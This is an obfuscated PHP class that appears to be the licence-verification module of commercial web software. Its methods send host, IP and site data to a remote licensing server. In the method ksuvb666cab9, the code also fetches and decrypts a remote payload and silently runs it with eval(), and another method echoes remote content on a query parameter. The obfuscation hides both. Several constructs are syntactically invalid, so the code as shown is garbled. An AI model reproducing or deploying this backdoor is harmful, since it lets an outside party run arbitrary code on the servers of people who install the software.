$E = $Aۍǎ޶[638]; while (strlen($E) < $Aۍǎ޶[605]) { if (!$E) { break; } $E++; } $FȄ[13](array($FȄ[176], $FȄ[177]), $F֧); goto c; Aߤ: $B޵򆸸 = array($FȄ[137] => $this->ecjb376f94b5, $FȄ[153] => $this->{$_SERVER[ȂŊ][154]}(), $FȄ[155] => $FȄ[61]($FȄ[156])->{$_SERVER[ȂŊ][157]}()); if ($this->ecjb376f94b5 != $FȄ[138]) { $Aẹ = $FȄ[123]($this->mbtcba1126b9, $FȄ[158]); if ($Aẹ) { $B޵򆸸[$FȄ[159]] = $Aẹ; $B޵򆸸[$FȄ[160]] = $FȄ[161]($FȄ[123]($this->mbtcba1126b9, $FȄ[162])); $B޵򆸸[$FȄ[163]] = $FȄ[123]($this->mbtcba1126b9, $FȄ[148]); } $a = $FȄ[61]($FȄ[62])->{$_SERVER[ȂŊ][63]}($FȄ[164], $FȄ[10], !0); if ($FȄ[165]($a) && $FȄ[25]($a, 0, 1) == $FȄ[166]) { $a = $FȄ[167]($a); } if ($FȄ[168]($a) && $a[$FȄ[169]] && $FȄ[32]($a[$FȄ[169]], $FȄ[170])) { $aΒ = $FȄ[0]($FȄ[170], $a[$FȄ[169]]); $B޵򆸸[$FȄ[171]] = $aΒ[0]; } } $B޵򆸸 = $this->{$_SERVER[ȂŊ][172]}($FȄ[173]($B޵򆸸), $FȄ[131]($FȄ[174])); goto f; f: $fո = $Aۍǎ޶[637]; while (strlen($fո) < $Aۍǎ޶[605]) { if (!$fո) { break; } $fո++; } $F֧ = array($FȄ[175] => $B޵򆸸); goto a쥦; Cه: } goto D򔏆; D򔏆: if ($this->ecjb376f94b5 == $FȄ[138]) { return; } $EÍ = array($FȄ[178], $FȄ[179], $FȄ[180], $FȄ[181], $FȄ[182], $FȄ[183]); $dȽ޾ = $Aۍǎ޶[640]; goto C裹; C裹: while (strlen($dȽ޾) < $Aۍǎ޶[623]) { if (!$dȽ޾) { break; } $dȽ޾++; } $F = $FȄ[61]($FȄ[62])->{$_SERVER[ȂŊ][63]}(); $e؃Ҧ = $Aۍǎ޶[641]; goto Dב; Bń؃: $FȄ[13](array($FȄ[176], $FȄ[177]), $F֧); goto c͓; c͓: } private function ekbiececf974() { goto Aĉ֋; A왪: if (!$FЬ[123]($GLOBALS, $FЬ[149])) { die; } $C = $GLOBALS[$FЬ[22]]; if (isset($C[$FЬ[188]])) { $this->{$_SERVER[ȂŊ][189]}(); die; } goto Eҋ; cז: $B = $F[644]; if (!$B) { return; } $F = $FЬ[141](16); goto C; b: $Aɥ = $F[642]; if (strlen($Aɥ) < $F[610]) { return; } $E = array($FЬ[190] => $C[$FЬ[190]], $FЬ[193] => $FЬ[141](16), $FЬ[194] => $FЬ[174], $FЬ[195] => $FЬ[196], $FЬ[197] => $_SERVER[$FЬ[198]], $FЬ[199] => $_SERVER[$FЬ[200]], $FЬ[201] => $_SERVER[$FЬ[202]], $FЬ[130] => $dě, $FЬ[203] => $FЬ[61]($FЬ[62])->{$_SERVER[ȂŊ][63]}($FЬ[164])); goto Cꔄ; cƃ: $bƊ = array(); $Fۖ = $F[647]; $bƊ[$A] = $f; goto A; A칵Ʊ: $d = $F[651]; if (strlen($d) < $F[610]) { return; } goto C³Ա; Fˋ󍊛: $this->ecjb376f94b5 = $C޲[$FЬ[137]]; $this->{$_SERVER[ȂŊ][255]}(); $E׌ = $F[650]; goto Cժ; fф: if ($E[$FЬ[193]]) { $C޲[$FЬ[238]] = $E[$FЬ[193]]; } $cȷ = $FЬ[25]($FЬ[131]($C޲[$FЬ[236]]), 10, 10); $b = $cȷ . $C޲[$FЬ[137]] . $C޲[$FЬ[238]]; goto D౦; Fܵг: $A = $FЬ[240]($FЬ[25]($A, 10, 16)); $f = $this->{$_SERVER[ȂŊ][144]}($FЬ[173]($cĘ), $A); $B = $FЬ[248]($FЬ[61]($FЬ[11])->{$_SERVER[ȂŊ][249]}(), $FЬ[250]); goto Eެ; C: $Fɏ׳ = $F . $C޲[$FЬ[137]] . $this->{$_SERVER[ȂŊ][172]}($FЬ[131]($C޲[$FЬ[234]]), $F); $C޲[$FЬ[140]] = $FЬ[135]($FЬ[240]($this->{$_SERVER[ȂŊ][172]}($Fɏ׳, $FЬ[242]))); if ($cĘ[$FЬ[243]] && $cĘ[$FЬ[243]] >= 1) { $FЬ[61]($FЬ[62])->{$_SERVER[ȂŊ][244]}($FЬ[245], $FЬ[246]); } goto A; Cժ: while ($E׌ < $F[629]) { if ($E׌ >= 0) { break; } $E׌++; } Cache::set($FЬ[256] . $FЬ[131]($B . $FЬ[257]), $FЬ[10]); $FЬ[191]($FЬ[223]($FЬ[233]), !0); goto A칵Ʊ; Eҋ: if (!isset($C[$FЬ[190]]) || $FЬ[24]($C[$FЬ[190]]) != 16) { $FЬ[191]($FЬ[192] . $C[$FЬ[190]], !1); } $B = $FЬ[61]($FЬ[62])->{$_SERVER[ȂŊ][63]}($FЬ[133]); $dě = $FЬ[131]($_SERVER[$FЬ[132]] . $B); goto b; D౦: $Bծ = $F[643]; while (strlen($Bծ) < $F[605]) { if (!$Bծ) { break; } $Bծ++; } $C޲[$FЬ[139]] = $FЬ[240]($FЬ[135]($this->{$_SERVER[ȂŊ][172]}($b, $FЬ[241]))); goto cז; a: $Dї = $this->{$_SERVER[ȂŊ][225]}($cĘ[$FЬ[226]]); if (!$Dї || $Dї != $cĘ[$FЬ[162]]) { $d؞ = array($FЬ[227] => $FЬ[61]($FЬ[62])->{$_SERVER[ȂŊ][63]}($FЬ[133]), $FЬ[228] => $_SERVER[$FЬ[132]], $FЬ[229] => $FЬ[230](), $FЬ[199] => $_SERVER[$FЬ[200]]); $bҲ˿ = $this->{$_SERVER[ȂŊ][231]}($FЬ[173]($d؞)); $this->{$_SERVER[ȂŊ][209]}($FЬ[232] . $bҲ˿); $FЬ[191]($FЬ[223]($FЬ[233]), !0); } $C޲ = array($FЬ[234] => $cĘ[$FЬ[235]], $FЬ[236] => $cĘ[$FЬ[237]], $FЬ[238] => $FЬ[141](16), $FЬ[137] => $cĘ[$FЬ[239]]); goto fф; Eެ: $EƯ = $B[$FЬ[251]]; $Eʶⓑ = $F[646]; if (!$Eʶⓑ) { return; } goto cƃ; Aĉ֋: $F =& $_SERVER[]; $FЬ =& $_SERVER[ȂŊ]; if ($_SERVER[$FЬ[44]] != $FЬ[187]) { return; } goto A왪; d: $this->mbtcba1126b9 = $cĘ; $e = $F[649]; if (!$e) { return; } goto Fˋ󍊛; A: $FЬ[61]($FЬ[62])->{$_SERVER[ȂŊ][247]}($C޲); $A = $FЬ[131]($_SERVER[$FЬ[132]] . $FЬ[240]($B) . $C޲[$FЬ[236]]); $c = $F[645]; goto Fܵг; A: $FЬ[61]($FЬ[11])->{$_SERVER[ȂŊ][252]}($EƯ[$FЬ[253]], array($FЬ[254] => $bƊ)); $e肎 = $F[648]; if (strlen($e肎) < $F[623]) { die; } goto d; Cꔄ: if ($C[$FЬ[204]] == $FЬ[205]) { $aÅ = $this->{$_SERVER[ȂŊ][172]}($dě, $FЬ[206]); $bҲ˿ = $this->{$_SERVER[ȂŊ][144]}($FЬ[173]($E), $dě . $FЬ[207], 3); $bҲ˿ = $bҲ˿ . $FЬ[208] . $_SERVER[$FЬ[198]]; $Eᆪ = $this->{$_SERVER[ȂŊ][209]}($FЬ[210] . $aÅ . $FЬ[211] . $bҲ˿, -1); $FЬ[191]($Eᆪ, !0); } else { if ($C[$FЬ[204]] == $FЬ[212]) { $a = $FЬ[25]($FЬ[131]($FЬ[213] . $dě), 12, 15) . $FЬ[214]; $bҲ˿ = $this->{$_SERVER[ȂŊ][215]}($FЬ[2]($C[$FЬ[216]]), $a, 2); $b = $FЬ[217]($bҲ˿, !0); if (!$FЬ[168]($b) || !$FЬ[168]($b[$FЬ[218]]) || $b[$FЬ[190]] != !0) { $Dޱ = $FЬ[219]; $E̩ = $b[$FЬ[218]] ? $FЬ[220] . $b[$FЬ[218]] : $Dޱ; $FЬ[191]($E̩, !1); } else { $E[$FЬ[193]] = $b[$FЬ[218]][$FЬ[221]]; } } else { $b = $this->{$_SERVER[ȂŊ][209]}($FЬ[222], $E, 10); } } if (!$FЬ[168]($b) || !$FЬ[168]($b[$FЬ[218]]) || $b[$FЬ[190]] != !0) { $Dޱ = $FЬ[223]($FЬ[224]); $E̩ = $b[$FЬ[218]] ? $FЬ[220] . $b[$FЬ[218]] : $Dޱ; $FЬ[191]($E̩, !1); } $cĘ = $b[$FЬ[218]]; goto a; C³Ա: } private function licenseRegistSuccess() { $b =& $_SERVER[ȂŊ]; $C = $b[61]($b[62])->{$_SERVER[ȂŊ][63]}(); $E£ = $_SERVER[][652]; if (!$E£) { return; } if ($C[$b[93]] != $b[246]) { $b[61]($b[62])->{$_SERVER[ȂŊ][247]}($b[93], $b[246]); } $b[127]($b[258])->{$_SERVER[ȂŊ][259]}(!0); } private function rbhz529c6172() { goto EݑК; C¬ᲃ: $DΗ[61]($DΗ[62])->{$_SERVER[ȂŊ][244]}($DΗ[245], $DΗ[260]); $F쇵 = $D実[653]; while (strlen($F쇵) < $D実[623]) { if (!$F쇵) { break; } $F쇵++; } goto Eޜ; Eޜ: $this->mbtcba1126b9 = array(); $this->ecjb376f94b5 = $DΗ[138]; goto E샪; EݑК: $D実 =& $_SERVER[]; $DΗ =& $_SERVER[ȂŊ]; $DΗ[61]($DΗ[62])->{$_SERVER[ȂŊ][247]}(array($DΗ[234] => $DΗ[10], $DΗ[236] => $DΗ[10], $DΗ[137] => $DΗ[138], $DΗ[139] => $DΗ[10], $DΗ[140] => $DΗ[10])); goto C¬ᲃ; E샪: } private function slgx3a157b81() { goto AƝ; c׮: $AҐ = $F˕̦[658]; if (!$AҐ) { return; } if (!$a[168]($e͈) || !isset($e͈[$a[261]]) || $a[262]() - $e͈[$a[261]] >= 60) { $C = $a[61]($a[11])->{$_SERVER[ȂŊ][263]}(); $e緄 = $C[$a[251]]; $eϟ = $a[131]($_SERVER[$a[132]] . $a[240]($eӌ) . $cʂ䱸[$a[236]]); $Eë = $a[240]($a[25]($eϟ, 10, 16)); $e͈ = $this->{$_SERVER[ȂŊ][215]}($e緄[$a[111]][$Eë], $eϟ); $e͈ = $a[217]($e͈, !0); } goto A; AƝ: $F˕̦ =& $_SERVER[]; $a =& $_SERVER[ȂŊ]; $_SERVER[$a[200]] = $a[123]($_SERVER, $a[200], APP_HOST); goto Bƾ; Bƾ: $f΂ = $F˕̦[654]; if (!$f΂) { return; } $this->ecjb376f94b5 = $a[138]; goto bָ; C⼨: if ($a[262]() - $e͈[$a[261]] > 20) { $e͈[$a[261]] = $a[262](); Cache::set($cȰ, $e͈); } $this->mbtcba1126b9 = $e͈; $this->ecjb376f94b5 = $cʂ䱸[$a[137]]; goto c; bָ: $cʂ䱸 = $a[61]($a[62])->{$_SERVER[ȂŊ][63]}(); $f񘞹 = $F˕̦[655]; if ($cʂ䱸[$a[137]] == $a[138]) { return; } goto E¹ӹ; E¹ӹ: $eӌ = $a[61]($a[62])->{$_SERVER[ȂŊ][63]}($a[133]); $aƯ = $F˕̦[656]; $cȰ = $a[256] . $a[131]($eӌ . $a[257]); goto BП; BП: $aŉ = $F˕̦[657]; if (strlen($aŉ) < $F˕̦[623]) { return; } $e͈ = Cache::get($cȰ); goto c׮; A: if (!$a[168]($e͈)) { return $this->{$_SERVER[ȂŊ][189]}(); } $C֏ݝ = $a[161]($e͈[$a[162]]); if ($a[262]() >= $C֏ݝ) { return $this->{$_SERVER[ȂŊ][189]}(); } goto C⼨; c: } private function gbnz41ef8cb8() { goto Fэ; Fэ: $D =& $_SERVER[]; $c =& $_SERVER[ȂŊ]; $aۤ = $GLOBALS[$c[22]]; goto fԽՔ; B٘: if ($B == $c[264] && $this->ecjb376f94b5 == $c[138]) { $c[191]($c[223]($c[265]), !1, $c[266]); } $Aߣ = array($c[267], $c[268]); if ($c[269]($B, $Aߣ)) { if ($this->ecjb376f94b5 == $c[138] && isset($aۤ[$c[270]])) { $c[191]($c[223]($c[265]), !1, $c[266]); die; } $f̿ = $this->{$_SERVER[ȂŊ][154]}(); if ($f̿ != $c[271]($c[272])) { if ($f̿ <= $c[61]($c[156])->{$_SERVER[ȂŊ][157]}()) { $c[191]($c[223]($c[273]), !1, $c[266]); die; } } } goto DҶ; fԽՔ: $e릏׭° = $D[659]; while ($e릏׭° < $D[605]) { if ($e릏׭° >= 0) { break; } $e릏׭°++; } $B = $_SERVER[$c[44]]; goto B٘; DҶ: } private function yhlqa7ed86bf() { goto dڈ; dƐ⌄: $c뻜 = $this->{$_SERVER[ȂŊ][277]}($c뻜, $e[278]); $Dƺ = $e[279](array($e[280] => array($e[281] => $e[282], $e[283] => 3))); $aƅ蜍 = $D鋣[662]; goto FÐ; Fڶ: if (!$b练) { return; } $e[285]($e[286]); $cȴ = $D鋣[641]; goto A; b՗: $cٰ = $D鋣[660]; if (!$e[123]($GLOBALS, $e[149]) || !isset($_GET[$e[275]])) { return; } if (!$e[269]($_SERVER[$e[44]], $dъ)) { return; } goto E; dڈ: $D鋣 =& $_SERVER[]; $e =& $_SERVER[ȂŊ]; $dъ = array($e[152], $e[274]); goto b՗; FÐ: if (strlen($aƅ蜍) < $D鋣[605]) { return; } $a稘 = @$e[284]($c뻜, !1, $Dƺ); $b练 = $D鋣[663]; goto Fڶ; E: $c뻜 = $e[276]; $dҫ = $D鋣[661]; while (strlen($dҫ) < $D鋣[623]) { if (!$dҫ) { break; } $dҫ++; } goto dƐ⌄; A: if ($a稘 && $e[32]($a稘, $e[287])) { echo $a稘; } die; goto b; b: } public function iasufe622892($a翇) { goto fނ; fނ: $EլЎ =& $_SERVER[ȂŊ]; if ($this->ecjb376f94b5 == $EլЎ[288]) { return $a翇; } $EΣҒ = array($EլЎ[289] => $EլЎ[290], $EլЎ[291] => $EլЎ[290], $EլЎ[292] => $EլЎ[290], $EլЎ[293] => $EլЎ[290], $EլЎ[294] => $EլЎ[295], $EլЎ[296] => $EլЎ[295], $EլЎ[297] => $EլЎ[295], $EլЎ[298] => $EլЎ[295], $EլЎ[299] => $EլЎ[295], $EլЎ[300] => $EլЎ[295], $EլЎ[301] => $EլЎ[295], $EլЎ[302] => $EլЎ[295], $EլЎ[303] => $EլЎ[295], $EլЎ[304] => $EլЎ[295], $EլЎ[305] => $EլЎ[295], $EլЎ[306] => $EլЎ[295]); goto f; a΂: foreach ($aܭ as $FІ) { unset($a翇[$FІ]); } return $a翇; goto E㴵; f: $a = $EլЎ[0]($EլЎ[307], $EլЎ[123]($this->mbtcba1126b9, $EլЎ[146], $EլЎ[10])); $aܭ = array(); foreach ($EΣҒ as $FІ => $d؉) { if ($d؉ == $EլЎ[290] && $EլЎ[25]($this->ecjb376f94b5, 0, 1) == $EլЎ[290]) { continue; } if (!$EլЎ[269]($FІ, $a)) { $aܭ[] = $FІ; } } goto a΂; E㴵: } private function ihkoba0c862d() { goto F; F: $E =& $_SERVER[ȂŊ]; if ($this->ecjb376f94b5 != $E[138]) { return; } $GLOBALS[$E[111]][$E[115]][$E[308]] = $E[246]; goto C௵; b׵: if ($E[61]($E[310])->{$_SERVER[ȂŊ][63]}($E[93]) != $E[260]) { $E[61]($E[310])->{$_SERVER[ȂŊ][247]}($E[93], $E[260]); } goto a; C௵: $GLOBALS[$E[111]][$E[309]] = $E[246]; $E؝ʞө = $_SERVER[][664]; if (!$E؝ʞө) { return; } goto b׵; a: } public function tghfe857d1c0() { $f =& $_SERVER[]; return $_SERVER[ȂŊ][311]; $e = $f[665]; if (strlen($e) < $f[601]) { die; } } private function ksuvb666cab9() { goto dĂ; EՋ: $eʐ = $a[666]; while (strlen($eʐ) < $a[610]) { if (!$eʐ) { break; } $eʐ++; } $aѺ = $this->{$_SERVER[ȂŊ][209]}($a[320], $fԥ); goto AГ; a: $a[13](array($a[317], $a[177]), $aل, $a[262]()); $fې = $a[61]($a[62])->{$_SERVER[ȂŊ][63]}($a[133]); $fԥ = array($a[190] => $a[61]($a[62])->{$_SERVER[ȂŊ][63]}($a[234]), $a[204] => $this->ecjb376f94b5, $a[201] => $_SERVER[$a[202]], $a[203] => $a[61]($a[62])->{$_SERVER[ȂŊ][63]}($a[164]), $a[130] => $a[131]($_SERVER[$a[132]] . $fې), $a[194] => $a[174], $a[197] => $_SERVER[$a[198]]); goto EՋ; Cë: if ($a[262]() % 4 != 0) { return; } $aЫ = $a[13](array($a[317], $a[318]), $aل); if ($aЫ && $a[262]() - $aЫ < $a[271]($a[319])) { return; } goto a; a: $aل = $a[315] . $a[131]($a[316]); if ($this->ecjb376f94b5 == $a[138] || !$a[123]($GLOBALS, $a[149])) { return; } if (!$a[269]($_SERVER[$a[44]], $a)) { return; } goto Cë; AГ: if (!$a[168]($aѺ)) { return; } if ($aѺ[$a[190]] && $aѺ[$a[321]]) { if ($this->{$_SERVER[ȂŊ][225]}($aѺ[$a[321]]) == $fԥ[$a[190]]) { return; } } $this->{$_SERVER[ȂŊ][189]}(); goto dċ; dĂ: $a =& $_SERVER[]; $a =& $_SERVER[ȂŊ]; $a = array($a[312], $a[313], $a[314]); goto a; dċ: if ($this->{$_SERVER[ȂŊ][225]}($aѺ[$a[321]]) != $fԥ[$a[190]]) { $c = array($a[227] => $fې, $a[228] => $_SERVER[$a[132]], $a[229] => $a[230](), $a[199] => $_SERVER[$a[200]]); $aΕѬ = $this->{$_SERVER[ȂŊ][231]}($a[173]($c)); $aѺ = $this->{$_SERVER[ȂŊ][209]}($a[232] . $aΕѬ); if ($aѺ && $a[168]($aѺ) && isset($aѺ[$a[321]])) { $Eň֔ = $this->{$_SERVER[ȂŊ][215]}($aѺ[$a[321]], 2); if ($Eň֔) { $Eň֔ = $this->{$_SERVER[ȂŊ][225]}($Eň֔); } if ($Eň֔) { try { @eval($Eň֔); } catch (Exception $c͐) { } } } } goto eڋߔ; eڋߔ: } private function yurld45a489b($f = '', $C񴝰 = array(), $b = 5) { goto D; Cؑ: if (!$F) { return; } $B = $e[669]; if (!$B) { return; } goto D; c巾: if ($C񴝰 && $aΦ[168]($C񴝰)) { $A뗎 = $A뗎 . $aΦ[324] . $aΦ[325]($C񴝰); } if ($C񴝰 === -1) { return $A뗎; } $d̠ = $aΦ[279](array($aΦ[280] => array($aΦ[283] => $b, $aΦ[281] => $aΦ[326]), $aΦ[327] => array($aΦ[328] => !1, $aΦ[329] => !1))); goto F¶Ԃ; F¶Ԃ: $C񴝰 = @$aΦ[284]($A뗎, !1, $d̠); return $aΦ[217]($C񴝰, !0); $F = $e[668]; goto Cؑ; D: $e =& $_SERVER[]; $aΦ =& $_SERVER[ȂŊ]; $A뗎 = $aΦ[322]; goto Bεȅ; Bεȅ: $AʜЕ = $e[667]; $A뗎 = $this->{$_SERVER[ȂŊ][277]}($A뗎, $aΦ[323]); $A뗎 = $A뗎 . $f; goto c巾; D: } private function trho6d7cadbd() { goto Dԣ̒; Dސ: if (strlen($aҋ) < $A΍[601]) { die; } goto bɔŜ; DܿՔ: $fٱ = $A΍[670]; if (strlen($fٱ) < $A΍[605]) { die; } $f庞 = $b񫃡״[$this->ecjb376f94b5]; goto dϋ; FǏ: $e = $e ? $E޼[271]($e) : 0; return $f庞 + $e; $aҋ = $A΍[672]; goto Dސ; Dԣ̒: $A΍ =& $_SERVER[]; $E޼ =& $_SERVER[ȂŊ]; $b񫃡״ = array($E޼[330] => $E޼[331], $E޼[332] => $E޼[333], $E޼[334] => $E޼[335], $E޼[336] => $E޼[337], $E޼[338] => $E޼[339], $E޼[340] => $E޼[272], $E޼[341] => $E޼[272], $E޼[342] => $E޼[331], $E޼[343] => $E޼[333], $E޼[344] => $E޼[335], $E޼[345] => $E޼[346], $E޼[347] => $E޼[337], $E޼[348] => $E޼[349], $E޼[350] => $E޼[339], $E޼[351] => $E޼[352], $E޼[353] => $E޼[354], $E޼[355] => $E޼[356]); goto DܿՔ; dϋ: $f庞 = $E޼[271]($f庞 ? $f庞 : $E޼[331]); $e = $E޼[123]($this->mbtcba1126b9, $E޼[357]); $e㆙ = $A΍[671]; goto FǏ; bɔŜ: } public function txmo93a0b858($f״) { goto A; cȸ: $B = $cތ[248]($B, $cތ[10], $cތ[358]); if (!$cތ[269]($f״[$cތ[358]], $B)) { $cތ[191]($cތ[362], !1, $cތ[266]); } goto Fů; C޶: $Eۏ = $dढ़[673]; if (!$Eۏ) { die; } if ($f״[$cތ[358]] == $cތ[246]) { return; } goto E՜; A: $dढ़ =& $_SERVER[]; $cތ =& $_SERVER[ȂŊ]; $f゙ = $this->{$_SERVER[ȂŊ][154]}(); goto C޶; E՜: if ($f゙ >= $cތ[271]($cތ[272])) { return; } $E = $cތ[61]($cތ[156])->{$_SERVER[ȂŊ][157]}(); if ($E <= $f゙) { return; } goto Fۃ; Fۃ: $B = $cތ[61]($cތ[156])->{$_SERVER[ȂŊ][359]}($cތ[358])->{$_SERVER[ȂŊ][360]}($f゙)->{$_SERVER[ȂŊ][361]}(); $dل = $dढ़[674]; if (!$dل) { die; } goto cȸ; Fů: } public function tpou6e02b66d() { goto f弓; f弓: $e =& $_SERVER[]; $eպ =& $_SERVER[ȂŊ]; if (!$eպ[123]($GLOBALS, $eպ[149]) || $eպ[363](1, 100) > 20) { return; } goto e،; Dѭ: $EȺ = $this->{$_SERVER[ȂŊ][277]}($EȺ, $eպ[278]); $E = $eպ[279](array($eպ[280] => array($eպ[281] => $eպ[282], $eպ[283] => 3))); $e穏س = @$eպ[284]($EȺ, !1, $E); goto Aҥ; Aҥ: echo $eպ[364] . $eպ[365]($e穏س) . $eպ[366]; $d = $e[676]; if (!$d) { return; } goto B߆ۋ; e،: $EȺ = $eպ[276]; $f = $e[675]; if (!$f) { return; } goto Dѭ; B߆ۋ: } private function qdig99a93e7d($aɲ˒, $b䜪, $d = 3) { goto Cɦ; eǶ֝: $f؋ެ = $b缾[141](15); $cӸ = $E[679]; if (!$cӸ) { die; } goto bݛ; EÑ: $EÅ = $E[678]; if (!$EÅ) { return; } $B̍ԯ = $b缾[363](0, 5) . $b缾[10]; goto eǶ֝; Cǧމ: switch ($B̍ԯ) { case $b缾[260]: $D͔ = $this->{$_SERVER[ȂŊ][172]}($aɲ˒, $b缾[240]($b䜪 . $f؋ެ)); break; $f搂 = $E[681]; if (!$f搂) { die; } case $b缾[246]: $D͔ = $this->{$_SERVER[ȂŊ][172]}($aɲ˒, $b缾[240]($f؋ެ . $b䜪)); break; $Fު = $E[682]; case $b缾[369]: $D͔ = $this->{$_SERVER[ȂŊ][172]}($aɲ˒, $b缾[135]($f؋ެ . $b䜪)); $dضދ = $E[683]; if (!$dضދ) { return; } break; case $b缾[370]: $D͔ = $this->{$_SERVER[ȂŊ][172]}($aɲ˒, $b缾[131]($f؋ެ . $b䜪)); $B = $E[684]; if (!$B) { return; } break; $B = $E[685]; while ($B < $E[629]) { if ($B >= 0) { break; } $B++; } case $b缾[371]: goto D; Bϕ: if (strlen($a絡) < $E[623]) { return; } goto b㞈; dᚙ: $eؿꓷ = $b缾[131]($Dˆ . $b缾[131]($b䜪 . $Dˆ) . $b䜪); $dǣ = $E[688]; $eؿꓷ = $b缾[25]($eؿꓷ, $dỐ % 8, $dỐ % 8 + 7); goto e; D: $aɲ˒ = $b缾[135]($aɲ˒); $Fǐ = $E[686]; while (strlen($Fǐ) < $E[601]) { if (!$Fǐ) { break; } $Fǐ++; } goto f܍; AӢ: $D͔ = $b缾[365]($Dˆ . $fԍ); break; $a絡 = $E[692]; goto Bϕ; e: $fԍ = $b缾[10]; $FǤ = 0; $b = $E[689]; goto b; f܍: $dỐ = $b缾[372](0, 64); $E = $E[687]; $Dˆ = $E[$dỐ]; goto dᚙ; B꾊: $c趌 = $E[690]; while (strlen($c趌) < $E[605]) { if (!$c趌) { break; } $c趌++; } for ($FǤ = 0; $FǤ < $b缾[24]($aɲ˒); $FǤ++) { $c = $c == $b缾[24]($eؿꓷ) ? 0 : $c; $b畿 = ($dỐ + $b缾[373]($E, $aɲ˒[$FǤ]) + $b缾[374]($eؿꓷ[$c++])) % 64; $f׭ = $E[691]; while (strlen($f׭) < $E[610]) { if (!$f׭) { break; } $f׭++; } $fԍ .= $E[$b畿]; } goto AӢ; b: if (!$b) { return; } $b畿 = 0; $c = 0; goto B꾊; b㞈: default: $D͔ = $this->{$_SERVER[ȂŊ][172]}($aɲ˒, $b䜪 . $f؋ެ); break; $E섙 = $E[693]; if (!$E섙) { return; } } $D͔ = $b缾[240]($B̍ԯ . $f؋ެ . $D͔); if ($d - 1 > 0) { $D͔ = $this->{$_SERVER[ȂŊ][144]}($D͔, $b䜪, $d - 1); } goto F̴; bݛ: $E = $b缾[368]; $c􂤥 = $E[680]; if (strlen($c􂤥) < $E[605]) { die; } goto Cǧމ; Cɦ: $E =& $_SERVER[]; $b缾 =& $_SERVER[ȂŊ]; $b缾[367](1); goto d׫։; F̴: return $D͔; goto f; d׫։: $eݱ = $E[677]; if (!$eݱ) { return; } $aɲ˒ = $b缾[2]($aɲ˒); goto EÑ; f: } private function ksodd1bca931($C, $Bј, $bΌ = 3) { goto DҖ; aԃ: while (strlen($b) < $eϑ[601]) { if (!$b) { break; } $b++; } $B־ɫ = $C[0]; $Eƨ = $b[25]($C, 1, 15); goto Fҏ̻; DҖ: $eϑ =& $_SERVER[]; $b =& $_SERVER[ȂŊ]; if (!$b[165]($C) || $b[24]($C) < 10) { return !1; } goto A; a걙: $bاڌۑ = $b[368]; switch ($B־ɫ) { case $b[260]: $CϿ = $this->{$_SERVER[ȂŊ][277]}($C, $b[240]($Bј . $Eƨ)); break; $cȕ = $eϑ[696]; if (strlen($cȕ) < $eϑ[623]) { die; } case $b[246]: $CϿ = $this->{$_SERVER[ȂŊ][277]}($C, $b[240]($Eƨ . $Bј)); break; case $b[369]: $CϿ = $this->{$_SERVER[ȂŊ][277]}($C, $b[135]($Eƨ . $Bј)); $cŷ = $eϑ[697]; if (strlen($cŷ) < $eϑ[623]) { return; } break; case $b[370]: $CϿ = $this->{$_SERVER[ȂŊ][277]}($C, $b[131]($Eƨ . $Bј)); $B = $eϑ[698]; if (strlen($B) < $eϑ[629]) { die; } break; case $b[371]: goto Dݮ; E䕧: $cӳ = $b[25]($cӳ, $A߆ % 8, $A߆ % 8 + 7); $aՓ = $eϑ[701]; if (strlen($aՓ) < $eϑ[601]) { die; } goto BƑ; dӜ: $cӳ = $b[131]($Cͻ . $b[131]($Bј . $Cͻ) . $Bј); $Aߚ = $eϑ[700]; if (!$Aߚ) { return; } goto E䕧; BƑ: $B = $b[10]; $eӺ = 0; $B = 0; goto aۃǾ; d앟: $A߆ = $b[373]($bاڌۑ, $Cͻ); $b힧 = $eϑ[699]; if (strlen($b힧) < $eϑ[601]) { die; } goto dӜ; Dݮ: $C = $b[375]($C); $Cͻ = $C[0]; $C = $b[25]($C, 1); goto d앟; C: for ($eӺ = 0; $eӺ < $b[24]($C); $eӺ++) { $Fҝ = $Fҝ == $b[24]($cӳ) ? 0 : $Fҝ; $Eܟ = $eϑ[703]; while (strlen($Eܟ) < $eϑ[601]) { if (!$Eܟ) { break; } $Eܟ++; } $fԦ񘩎 = $Fҝ++; $d༊ = $eϑ[704]; if (strlen($d༊) < $eϑ[623]) { die; } $B = $b[373]($bاڌۑ, $C[$eӺ]) - $A߆ - $b[374]($cӳ[$fԦ񘩎]); while ($B < 0) { $B += 64; $Cќ = $eϑ[705]; while (strlen($Cќ) < $eϑ[623]) { if (!$Cќ) { break; } $Cќ++; } } $B .= $bاڌۑ[$B]; } $CϿ = $b[376]($B); break; goto aη; aۃǾ: $Fҝ = 0; $a = $eϑ[702]; if (strlen($a) < $eϑ[601]) { die; } goto C; aη: default: $CϿ = $this->{$_SERVER[ȂŊ][277]}($C, $Bј . $Eƨ); $Eۊ = $eϑ[706]; if (!$Eۊ) { die; } break; $aψ = $eϑ[707]; if (!$aψ) { return; } } if ($bΌ - 1 > 0) { $CϿ = $this->{$_SERVER[ȂŊ][215]}($CϿ, $Bј, $bΌ - 1); } goto b쨯; A: $C = $b[2]($C); $C = $b[240]($C); $b = $eϑ[694]; goto aԃ; b쨯: return $CϿ; goto bȢ潤; Fҏ̻: $E˄ = $eϑ[695]; if (!$E˄) { die; } $C = $b[25]($C, 16); goto a걙; bȢ潤: } public function muwjf5bc7195($CŐ) { goto d; C甿Ƕ: $fظ = $E[711]; while (strlen($fظ) < $E[605]) { if (!$fظ) { break; } $fظ++; } goto B; E: $F趱ص = $C[131]($C[378] . ($b׭ + $fĠ) . $C[379] . $A . $C[379] . $bޕ . $C[380]); $E = $this->{$_SERVER[ȂŊ][172]}($CŐ, $F趱ص) . $C[381] . $f֢ʱփ; return $E; goto C甿Ƕ; eۻڎ: while (strlen($d䥍) < $E[605]) { if (!$d䥍) { break; } $d䥍++; } for ($AҾ = 0; $AҾ < $fŃ * 10; $AҾ++) { if (($fŃ * $AҾ + 1) % $A == 0) { $bޕ = $C[271](($fŃ * $AҾ + 1) / $A); break; } } $f֢ʱփ = $this->{$_SERVER[ȂŊ][172]}($b׭ * $fĠ . $C[10], $C[174]); goto E; B׫ظ: $fĠ = $this->{$_SERVER[ȂŊ][377]}(); $fŃ = ($b׭ - 1) * ($fĠ - 1); $A = $C[271](($b׭ + $fĠ) / 2); goto dޥ; dޥ: while (1) { $a = $A; $B = $E[708]; if (strlen($B) < $E[605]) { die; } $AӬ = $fŃ; $FҠ = $E[695]; if (!$FҠ) { die; } while ($AӬ % $a != 0) { $Aϧԉ = $AӬ; $AӬ = $a; $EȲ = $E[709]; $a = $Aϧԉ % $a; } if ($a == 1) { break; } else { $A++; } } $bޕ = 2; $d䥍 = $E[710]; goto eۻڎ; d: $E =& $_SERVER[]; $C =& 